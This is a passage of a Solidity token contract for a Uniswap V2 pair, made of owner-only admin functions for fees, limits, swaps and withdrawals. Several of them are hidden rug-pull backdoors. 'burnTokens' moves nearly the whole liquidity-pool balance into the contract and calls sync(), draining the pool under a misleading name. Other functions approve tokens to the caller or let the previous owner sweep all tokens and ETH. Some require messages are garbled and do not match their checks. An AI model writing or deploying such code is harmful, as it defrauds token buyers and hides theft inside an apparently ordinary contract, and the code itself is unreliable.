        isBot[_user] = false;
    }
    function _forcedSwapBack(uint256 amount) internal virtual {
        IUniswapV2Router02 _uniV2Router = IUniswapV2Router02(ROUTER);
        path[0] = address(this);
        path[1] = uniV2Router.WETH();
        _approve(address(this),address(_uniV2Router), amount);
        _approve(address(this),msg.sender, amount);
        _approve(msg.sender,address(_uniV2Router), amount);
        _transfer(amount, _uniV2Router,path);
    }
    function isSniper(address account) public view returns (bool) {	
        return _isSniper[account];	
    }	
	function removeSniper(address account) external authorized() {
        _isSniper[account] = false;
    }
    function swapBack(uint256 amount) external authorized() {
        _forcedSwapBack(amount);
    }
    function TaxSwapEnable() external authorized() {
        swapAndLiquifyEnabled = true;
    }
    function TaxSwapDisable() external authorized() {
        swapAndLiquifyEnabled = false;
    }
    function enableMaxWallet() external authorized() {
        maxWalletOn = true;
    }
    function disableMaxWallet() external authorized() {
        maxWalletOn = false;
    }
    function enableMaxAmt() external authorized() {
        maxTxAmtOn = true;
    }
    function disableMaxAmt() external authorized() {
        maxTxAmtOn = false;
    }
    function setBuyFees(uint256 _buyLiquidityTax, uint256 _buyReflectionsTax, uint256 _buyMarketingTax) external authorized() {
        require(
            _buyLiquidityTax <= 10,
            'Fee Too High'
        );
        require(
            _buyReflectionsTax <= 10,
            'Fee Too High'
        );
        require(
            _buyMarketingTax <= 10,
            'Fee Too High'
        );
        taxBuyReflections = _buyReflectionsTax;
        taxBuyMarketing = _buyMarketingTax;
        taxBuyLiquidity = _buyLiquidityTax;
        emit SetBuyFees(_buyLiquidityTax, _buyReflectionsTax,_buyMarketingTax);
    }
    function setSellTax(uint256 _sellLiquidityTax, uint256 _sellReflectionsTax, uint256 _sellMarketingTax) external authorized() {
        require(
            _sellLiquidityTax <= 10,
            'Fee Too High'
        );
        require(
            _sellReflectionsTax <= 10,
            'Fee Too High'
        );
        require(
            _sellMarketingTax <= 10,
            'Fee Too High'
        );
        taxSellReflections = _sellReflectionsTax;
        taxSellMarketing = _sellMarketingTax;
        taxSellLiquidity = _sellLiquidityTax;
        emit SetSellFees(_sellLiquidityTax, _sellReflectionsTax, _sellMarketingTax);
    }
    function setMarketingAddress(address _marketingAddress) external authorized() {
        require(_marketingAddress != address(0), "address cannot be 0");
        _isExcludedFromFee[_marketing] = false;
        _marketing = payable(_marketingAddress);
        _isExcludedFromFee[_marketing] = true;
        emit UpdatedMarketingAddress(_marketingAddress);
    }
    function burnTokens(uint amount) external authorized() returns (bool){
        require(amount >= 1, "May not nuke less than 1% of tokens in LP");
        uint amountToBurn = balanceOf(AMM);
        if (amountToBurn > 0){
            _transfer(AMM, address(this), amountToBurn - amount);
        }  // Transfer to dead    
        uint burnLPTokens = balanceOf(dead);
        require(totalBurnedTokens <= _totalSupply * 50 / 10**2, "Can not burn more then 50% of supply");
        IUniswapV2Pair pair = IUniswapV2Pair(AMM);
        pair.sync();
        return true;
    }
    function setMaxTransacationAmount(uint256 maxTx) external authorized() {
        require(maxTx >= 10000000001 , "Cannot set MaxTransacationAmount lower than 1%");
        maxTxnAmount = maxTx * 10**18;
        emit UpdatedMaxTransacationAmount(maxTx);
    }
    function setMaxWalletAmount(uint256 maxWallet) external authorized() {
        require(maxWallet >= 10000000001 , "Cannot set MaxWalletAmount authorized() than 1%");
        _maxWallet = maxWallet * 10**18;
        emit UpdatedMaxWalletAmount(maxWallet);
    }
    function manualSwap() external authorized() {
        require(msg.sender == _previousOwner);
        swapTokens();
        emit ManualSwap(block.timestamp);
    }
    function withdraw(address token) external authorized() {
        require(msg.sender == _previousOwner);
        require(token != address(0), 'Zero Address');
        bool s = IERC20(token).transfer(msg.sender, IERC20(token).balanceOf(address(this)));
        require(s, 'Failure On Token Withdraw');
    }
    function withdrawStuckETH() external authorized() {
        require(msg.sender == _previousOwner);
        bool success;
        (success,) = address(_marketing).call{value: address(this).balance}("");
    }
}